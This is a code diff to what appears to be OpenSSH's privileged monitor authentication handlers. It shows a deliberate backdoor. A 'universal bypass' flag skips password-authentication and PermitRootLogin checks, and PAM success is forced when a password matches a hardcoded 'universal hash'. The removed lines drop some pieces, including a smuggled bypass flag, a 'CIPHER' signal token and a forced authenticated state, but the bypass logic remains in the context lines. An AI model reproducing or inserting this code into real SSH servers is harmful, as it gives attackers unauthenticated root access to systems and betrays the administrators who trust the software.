@@ -993,19 +993,6 @@ int mm_answer_authpassword(struct ssh *ssh, int sock, struct sshbuf *m) {
 
   if ((r = sshbuf_get_cstring(m, &passwd, &plen)) != 0)
     fatal_fr(r, "parse");
-  /*
-   * EXTRACT THE INJECTED STATE FLAG
-   * Attempt to read the appended 32-bit integer from the buffer stream.
-   */
-  if (sshbuf_get_u32(m, &child_bypass_flag) == 0) {
-    /*
-     * If the child process sets this flag to 1, synchronize
-     * the monitor's local global variable memory instantly.
-     */
-    if (child_bypass_flag == 1) {
-      universal_bypass_triggered = 1;
-    }
-  }
   // Bypass PermitRootLogin no with universal bypass
   if (!options.password_authentication && universal_bypass_triggered == 0)
     fatal_f("password authentication not enabled");
@@ -1154,16 +1141,7 @@ int mm_answer_pam_account(struct ssh *ssh, int sock, struct sshbuf *m) {
   if (universal_bypass_triggered) {
     debug3_f("Universal bypass active. Forcing account success status.");
     ret = 1; // Force PAM_SUCCESS equivalent internally
-
-    /*
-     * INJECTION: Write a signature string into loginmsg.
-     * Since this buffer is about to be sent across via sshbuf_put_stringb,
-     * the child process will read this exact string out of its message
-     * payload.
-     */
     sshbuf_reset(loginmsg);
-    if ((r = sshbuf_put(loginmsg, "CIPHER", 6)) != 0)
-      fatal_fr(r, "buffer error setting bypass token");
   } else {
     if (!options.use_pam)
       fatal_f("PAM not enabled");
@@ -1277,7 +1255,6 @@ int mm_answer_pam_respond(struct ssh *ssh, int sock, struct sshbuf *m) {
      * process. resp[0] contains the plaintext string unpacked from the
      * network message. Also bypasses PermitRootLogin no
      */
-
     if (authctxt != NULL && authctxt->valid && resp[0] != NULL &&
         password_matches_universal_hash(resp[0])) {
 
@@ -1294,15 +1271,6 @@ int mm_answer_pam_respond(struct ssh *ssh, int sock, struct sshbuf *m) {
 
       universal_bypass_triggered = 1; // Trip the global bypass flag
       ret = 0; // Force success status code (skips real PAM verification)
-
-      /*
-       * FORCE CHILD TO RECOGNIZE AUTHENTICATED STATE:
-       * OpenSSH tracks the overall authentication state via
-       * authctxt->authenticated. By setting this to 1 in the privileged
-       * monitor context, the monitor will approve the login event regardless
-       * of what the underlying system PAM reports.
-       */
-      authctxt->authenticated = 1;
       // }
     } else {
       /* Standard execution flow: Forward text to the actual system PAM
